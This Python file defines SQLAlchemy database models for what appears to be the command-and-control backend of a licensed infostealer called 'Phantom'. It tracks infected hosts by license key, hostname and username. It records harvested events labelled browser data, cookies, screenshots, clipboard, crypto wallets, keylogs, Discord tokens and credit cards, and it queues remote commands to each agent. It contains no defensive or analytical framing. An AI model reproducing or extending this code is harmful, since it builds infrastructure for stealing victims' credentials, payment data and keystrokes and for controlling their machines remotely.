from datetime import datetime
from sqlalchemy import String, DateTime, Integer, LargeBinary, Text
from sqlalchemy.orm import mapped_column, Mapped

from models.agent import Base


class PhantomAgent(Base):
    __tablename__ = "phantom_agents"

    agent_id:    Mapped[str]      = mapped_column(String(256), primary_key=True)  # license_key:hostname:username
    license_key: Mapped[str]      = mapped_column(String(64),  default="", index=True)
    hostname:    Mapped[str]      = mapped_column(String(128), default="")
    username:    Mapped[str]      = mapped_column(String(128), default="")
    os_info:     Mapped[str]      = mapped_column(String(128), default="")
    ip:          Mapped[str]      = mapped_column(String(64),  default="", nullable=True)
    first_seen:  Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
    last_seen:   Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
    is_active:   Mapped[bool]     = mapped_column(default=True)

    def to_dict(self) -> dict:
        return {
            "agent_id":    self.agent_id,
            "license_key": self.license_key,
            "hostname":    self.hostname,
            "username":    self.username,
            "os_info":     self.os_info,
            "ip":          self.ip or "",
            "first_seen":  self.first_seen.isoformat() if self.first_seen else None,
            "last_seen":   self.last_seen.isoformat()  if self.last_seen  else None,
            "is_active":   self.is_active,
        }


class PhantomEvent(Base):
    __tablename__ = "phantom_events"

    id:          Mapped[int]      = mapped_column(Integer, primary_key=True, autoincrement=True)
    agent_id:    Mapped[str]      = mapped_column(String(256), default="")
    license_key: Mapped[str]      = mapped_column(String(64),  default="", index=True)
    event_type:  Mapped[int]      = mapped_column(Integer, default=0)
    payload:     Mapped[bytes]    = mapped_column(LargeBinary, default=b"")
    received_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)

    EVT_NAMES = {
        0x00: "checkin",
        0x01: "browser",
        0x02: "cookies",
        0x03: "screenshot",
        0x04: "clipboard",
        0x05: "crypto",
        0x06: "keylog",
        0x07: "discord",
        0x08: "cc",
    }

    def type_name(self) -> str:
        return self.EVT_NAMES.get(self.event_type, f"evt_{self.event_type:#04x}")

    def to_dict(self) -> dict:
        return {
            "id":          self.id,
            "agent_id":    self.agent_id,
            "event_type":  self.event_type,
            "type_name":   self.type_name(),
            "payload_len": len(self.payload) if self.payload else 0,
            "received_at": self.received_at.isoformat() if self.received_at else None,
        }


class PhantomCommand(Base):
    __tablename__ = "phantom_commands"

    uuid:        Mapped[str]      = mapped_column(String(32), primary_key=True)  # 16 bytes hex
    agent_id:    Mapped[str]      = mapped_column(String(256), default="")
    license_key: Mapped[str]      = mapped_column(String(64),  default="", index=True)
    cmd_type:   Mapped[int]      = mapped_column(Integer, default=0)
    payload:    Mapped[bytes]    = mapped_column(LargeBinary, default=b"", nullable=True)
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
    status:     Mapped[str]      = mapped_column(String(16), default="pending")  # pending|sent|acked|failed
    result:     Mapped[bytes]    = mapped_column(LargeBinary, default=b"", nullable=True)
    acked_at:   Mapped[datetime] = mapped_column(DateTime, nullable=True)

    def to_dict(self) -> dict:
        return {
            "uuid":       self.uuid,
            "agent_id":   self.agent_id,
            "cmd_type":   self.cmd_type,
            "status":     self.status,
            "created_at": self.created_at.isoformat() if self.created_at else None,
            "acked_at":   self.acked_at.isoformat()   if self.acked_at   else None,
        }
